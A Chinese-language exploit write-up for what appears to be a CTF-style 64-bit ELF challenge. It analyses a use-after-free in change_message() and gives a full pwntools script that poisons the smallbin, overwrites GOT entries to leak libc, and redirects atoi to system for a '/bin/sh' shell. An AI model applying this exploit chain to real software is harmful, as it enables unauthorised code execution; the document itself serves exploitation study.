# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接
- **安全特性**（推断自代码模式）：
  - No PIE：全局变量地址固定（如name@0x6020a0, page_list@0x602100）
  - Partial RELRO：GOT表可写（exp成功覆盖GOT条目）
  - No Stack Canary：read_int函数使用栈缓冲区但无canary检查
  - NX Enabled：代码段不可执行，exp使用GOT覆盖而非shellcode
- **依赖库**：依赖libc（通过ldd确认，exp中使用了libc.symbols）
- **运行需求**：需要标准输入输出，使用malloc/free进行堆管理

## 漏洞成因
### 关键结构体分析
```c
// 全局变量布局（BSS段）
char name[0x20];          // 0x6020a0
void *message;            // 0x6020e0  
void *page_list[8];       // 0x602100
int size_list[8];         // 0x602140
```

### 漏洞类型：Use-After-Free (UAF) + 堆布局操纵
**主要漏洞位置**：`change_message()`函数
```c
void *change_message() {
    printf("Your message is saved at %p\n", message); // 泄露堆地址
    free(message);                    // 释放message chunk
    buf = malloc(v1);                 // 分配新chunk
    read(0, message, 0x10u);          // UAF：向已释放的message写入数据
    message = buf;                    // 更新message指针
}
```

**漏洞机理**：
1. **UAF漏洞**：free(message)后，仍能通过原message指针写入16字节数据
2. **堆元数据破坏**：通过UAF修改free chunk的fd/bk指针，污染smallbin链表
3. **任意地址分配**：利用污染的smallbin实现malloc到GOT区域
4. **GOT覆盖**：通过page_list指向GOT，实现任意函数指针覆盖

## 漏洞利用过程
### 内存变化时序表
| 步骤 | 操作 | 堆布局变化 | 全局变量变化 | 关键效果 |
|------|------|------------|-------------|----------|
| 1 | init_name_message() | 分配message(0xb0)和page(0xc8)chunk | name="a", message→堆, page_list[0]→堆 | 初始堆布局建立 |
| 2 | change_mesg(200,"11",payload) | free旧message，分配新chunk，修改free chunk的bk为GOT地址 | message→新堆地址 | smallbin污染，bk指向stdin GOT |
| 3 | change_name(payload) | - | name被覆盖为伪造堆元数据 | 构造任意地址写基础 |
| 4 | add(0xb0)×2 | 利用污染smallbin分配chunk到GOT区域 | page_list[1]和[2]指向GOT地址 | 获得GOT写权限 |
| 5 | edit(2,payload) | - | page_list指向free/puts/atoi GOT | 建立GOT覆盖路径 |
| 6 | edit(0,p64(0x4006a0)) | - | free@got被覆盖为puts@plt | 控制流劫持准备 |
| 7 | dele(1) | 触发free(实际调用puts) | - | 泄露libc地址 |
| 8-9 | 计算system地址，edit(2,p64(system)) | - | atoi@got被覆盖为system | 获得system执行能力 |
| 10 | send("/bin/sh") | - | - | 触发system("/bin/sh") |
| 11 | interactive() | 进程替换为/bin/dash | 全新内存映射 | 获取shell权限 |

### 堆内存演变详情
- **初始状态**：message chunk (0x300e000) + page chunk (0x300e0c0) 相邻
- **污染后**：smallbin链表 0x300e000 → 0x300e190，bk指向0x602090(stdin GOT)
- **利用阶段**：通过伪造chunk实现在GOT区域"分配"内存，覆盖函数指针

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample26')
libc = elf.libc
p = process("./data/sample26")
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

def add(size):
    p.sendline(b'1')
    p.sendafter(b'size:\n',str(size).encode('utf-8'))

def dele(idx):
    p.sendline(b'3')
    p.send(str(idx).encode('utf-8'))

def edit(idx,context):
    p.sendline(b'2')
    p.sendline(str(idx).encode('utf-8'))
    p.send(context)

def change_name(name):
    p.sendline(b'4')
    p.send(name)

def change_mesg(size,new_mesg,mesg):
    p.sendline(b'5')
    p.recvuntil(b'saved at ')
    a = p.recvline()[:-1]
    print('leak--->',a)
    heap_addr = int(a,16)
    # 关键：构造payload修改free chunk的bk指针指向GOT区域
    payload = p64(heap_addr+0xb0+0xd0)
    mesg = payload + mesg
    print('---->',hex(heap_addr))
    p.send(str(size).encode('utf-8'))
    p.send(new_mesg)
    p.send(mesg)  # UAF利用：向已释放chunk写入伪造元数据
    return a

# 步骤1：初始化堆布局
p.sendlineafter(b'writer:\n',b'a')
p.sendlineafter(b'book?\n',b'a')
add(0xC8)  # 分配第一个page chunk

# 步骤2：利用UAF泄露堆地址并污染smallbin
payload = p64(0x6020A0-0x10)  # 指向name区域之前，构造伪造chunk
heap_addr = change_mesg(200,b'11',payload)
heap_addr = int(heap_addr,16)

# 步骤3：通过change_name注入伪造指针链
payload = p64(heap_addr-0x10)+p64(0x6020A0+0x8)+p64(0)+p64(0x6020A0-0x10)
change_name(payload)  # 覆盖name为精心构造的堆元数据

# 步骤4：利用污染smallbin实现任意地址分配
add(0xb0)  # 分配到被控制的地址
add(0xb0)  # 获得GOT区域写权限

# 步骤5：构造GOT覆盖payload
payload = b'a'*0x40+p64(heap_addr+0xb0+0xc0+0xd0)+b'a'*0x18+p64(free_got)+p64(puts_got)+p64(atoi_got)
edit(2,payload)  # 修改page_list指向GOT表

# 步骤6：覆盖free@got为puts@plt
edit(0,p64(0x4006A0))  # 0x4006a0为puts@plt地址

# 步骤7：触发free(实际调用puts)泄露libc地址
dele(1)
p.recvuntil(b'delete?\n')
puts_addr = p.recvline()[:-1]

# 步骤8-9：计算system地址并覆盖atoi@got
puts_addr = int.from_bytes(puts_addr,'little')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
edit(2,p64(system_addr))  # 覆盖atoi@got为system

# 步骤10：触发system("/bin/sh")
p.send(b'/bin/sh\x00')  # 下一次atoi调用将执行system("/bin/sh")

# 步骤11：获取shell
p.interactive()
```

### 关键利用技术说明
1. **堆地址泄露**：通过change_message的printf泄露堆基址
2. **smallbin污染**：利用UAF修改free chunk的bk指针，使后续malloc分配到GOT区域  
3. **GOT劫持**：通过污染的page_list实现任意GOT条目覆盖
4. **Libc地址泄露**：覆盖free为puts，调用free时实际执行puts泄露libc地址
5. **系统命令执行**：覆盖atoi为system，输入"/bin/sh"触发shell

此利用链成功结合了UAF、堆布局操纵和GOT覆盖技术，最终实现在无PIE和部分RELRO环境下的权限提升。
